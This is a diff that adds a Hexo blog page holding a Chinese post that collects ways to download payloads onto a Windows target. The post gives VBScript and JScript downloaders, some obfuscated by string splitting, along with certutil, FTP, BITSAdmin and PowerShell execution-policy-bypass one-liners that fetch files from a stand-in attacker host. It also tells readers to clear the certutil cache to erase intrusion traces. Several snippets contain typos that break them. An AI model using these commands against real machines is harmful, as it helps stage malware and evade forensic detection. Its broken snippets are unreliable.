@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="windows平台下paylaod下载 使用vbs下载payload  保存为downfile.vbs 1set a&#x3D;creatobject(&quot;adod&quot;+&quot;b.stream&quot;):set w&#x3D;creatobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.resp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows平台paylaod下载">
+<meta property="og:url" content="https://gnwing.github.io/2022/01/09/windows%E5%B9%B3%E5%8F%B0paylaod%E4%B8%8B%E8%BD%BD/index.html">
+<meta property="og:site_name" content="GNWING&#39;s BLOG">
+<meta property="og:description" content="windows平台下paylaod下载 使用vbs下载payload  保存为downfile.vbs 1set a&#x3D;creatobject(&quot;adod&quot;+&quot;b.stream&quot;):set w&#x3D;creatobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.resp">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-01-09T13:57:13.919Z">
+<meta property="article:modified_time" content="2022-01-09T13:57:13.919Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://gnwing.github.io/2022/01/09/windows平台paylaod下载/"/>
+
+
+
+
+
+  <title>windows平台paylaod下载 | GNWING's BLOG</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">GNWING's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://gnwing.github.io/2022/01/09/windows%E5%B9%B3%E5%8F%B0paylaod%E4%B8%8B%E8%BD%BD/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="GNWING's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">windows平台paylaod下载</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-01-09T13:57:13+00:00">
+                2022-01-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="windows平台下paylaod下载"><a href="#windows平台下paylaod下载" class="headerlink" title="windows平台下paylaod下载"></a>windows平台下paylaod下载</h2><blockquote>
+<p>使用vbs下载payload</p>
+</blockquote>
+<p>保存为downfile.vbs</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> a=creatobject(<span class="string">"adod"</span>+<span class="string">"b.stream"</span>):<span class="keyword">set</span> w=creatobject(<span class="string">"micro"</span>+<span class="string">"soft.xmlhttp"</span>):w.open<span class="string">"get"</span>,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.type=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>命令行下执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript downfile.vbs http:&#x2F;&#x2F;attack.com&#x2F;rebots.txt C:\TMP\b.txt</span><br></pre></td></tr></table></figure>
+
+<p>通常在windows上，用echo方法来写入vbs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set  w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments(  0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>
+
+<p>当不能使用参数时，用一个完整的vbs</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL = <span class="string">"http://attack.com/robots.txt"</span></span><br><span class="line">strHDLocation = <span class="string">"c:\test\logo.txt"</span></span><br><span class="line"><span class="keyword">Set</span> objXMLHTTP = <span class="built_in">CreateObject</span>(<span class="string">"MSXML2.XMLHTTP"</span>)</span><br><span class="line">objXMLHTTP.open <span class="string">"GET"</span>, strFileURL, <span class="literal">false</span></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line"><span class="keyword">If</span> objXMLHTTP.Status = <span class="number">200</span> <span class="keyword">Then</span></span><br><span class="line"><span class="keyword">Set</span> objADOStream = <span class="built_in">CreateObject</span>(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type = <span class="number">1</span></span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody </span><br><span class="line">objADOStream.Position = <span class="number">0</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="built_in">CreateObject</span>(<span class="string">"Scripting.FileSystemObject"</span>)</span><br><span class="line"><span class="keyword">If</span> objFSO.Fileexists(strHDLocation) <span class="keyword">Then</span> objFSO.DeleteFile strHDLocati <span class="keyword">on</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="literal">Nothing</span></span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line"><span class="keyword">Set</span> objADOStream = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">if</span></span><br><span class="line"><span class="keyword">Set</span> objXMLHTTP = <span class="literal">Nothing</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>使用js一句话下载payload</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WinHttpReq = <span class="keyword">new</span> ActiveObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);</span><br><span class="line">WinHttpReq.Open(<span class="string">"GET"</span>,WScirpt.Arguments(<span class="number">0</span>),<span class="comment">/*async=*false);</span></span><br><span class="line"><span class="comment">WinHttpReq.Send();</span></span><br><span class="line"><span class="comment">WScript.Echo(WinHttpReq.ResponseText);</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WinHttpReq = <span class="keyword">new</span> ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);</span><br><span class="line">WinHttpReq.Open(<span class="string">"GET"</span>,WScript.Arguments(<span class="number">0</span>),<span class="comment">/*async*/</span><span class="literal">false</span>);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream = <span class="keyword">new</span> ActiveXObject(<span class="string">"ADODB.Stream"</span>);</span><br><span class="line">BinStream.Type = <span class="number">1</span>;</span><br><span class="line">BinStream.Open();</span><br><span class="line">BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(<span class="string">"micropoor.exe"</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript &#x2F;nologo downfile.js http:&#x2F;&#x2F;attack.com&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>使用certutil.exe下载payload</p>
+<p>certutil.exe是一个命令行程序，作为证书服务的一部分安装</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;attack.com&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>默认下载为bin文件，但是不影响在命令行下使用</p>
+<p>certutil.exe下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹，所以每次 下载后，需要马上执行如下： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cetutil.exe -urlcache -split -f http:&#x2F;&#x2F;attack.com&#x2F;robots.txt delete</span><br></pre></td></tr></table></figure>
+
+<p>certutil还可以加解密</p>
+<blockquote>
+<p>使用ftp下载payload</p>
+</blockquote>
+<p>ftp文件的传输方式：</p>
+<ul>
+<li>Binary：二进制传输</li>
+<li>Ascii：ascII传输</li>
+</ul>
+<p>在FTP文件传输过程中，ASCII传输HTML和文本编写的文件，而二进制传输可以传送文本和非文本（执行文件，压缩文件，图片等），具有通用性。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.1.115 21&gt; ftp.txt </span><br><span class="line">echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;user </span><br><span class="line">echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;password </span><br><span class="line">echo binary &gt;&gt; ftp.txt &#x2F;&#x2F;bin模式 </span><br><span class="line">echo get robots.txt &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>使用BITSAdmin下载paylaod</p>
+</blockquote>
+<p>BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度</p>
+<p>自windows7 以上把呢不能内置bitsadmin，可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有者不错的性能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer down &quot;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&quot; C:\TMP\robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果需要下载过大的文件，需要提高提高优先级。配合上面的下载命令。再次执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;setpriority down foregroup</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>使用powershell下载payload</p>
+</blockquote>
+<p>靶机win7，Powershell2.0</p>
+<p>down.ps1，基于System.Net.WebClient</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$Urls &#x3D; @()</span><br><span class="line">$Urls +&#x3D; &quot;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&quot;</span><br><span class="line">$OutPath &#x3D; &quot;C:\TMP\&quot;</span><br><span class="line">ForEach($item in $Urls)&#123;</span><br><span class="line">$file &#x3D; $OutPath + ($item).split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile($item,$file)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>靶机windows2012，Powershell大于3.0</p>
+<p>在Powershell 3.0以后，提供wget功能，既Invoke-WebRequest</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$url &#x3D; &quot;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&quot;</span><br><span class="line">$output &#x3D; &quot;C:\TMP\robots.txt&quot;</span><br><span class="line">$start_time &#x3D; Get-Date</span><br><span class="line">$Invoke-WebRequest-Uri $url-OutFile $output</span><br><span class="line">Write-Output &quot;Times:$((Get-Date).Subtract($start_time).Seconds) second(s)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>一句话下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&#39;,&#39;C:\TMP\robots.txt&#39;)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/01/09/%E6%94%BB%E5%87%BBFTP%E6%9C%8D%E5%8A%A1/" rel="next" title="攻击FTP服务">
+                <i class="fa fa-chevron-left"></i> 攻击FTP服务
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/01/09/test/" rel="prev" title="test">
+                test <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows平台下paylaod下载"><span class="nav-number">1.</span> <span class="nav-text">windows平台下paylaod下载</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
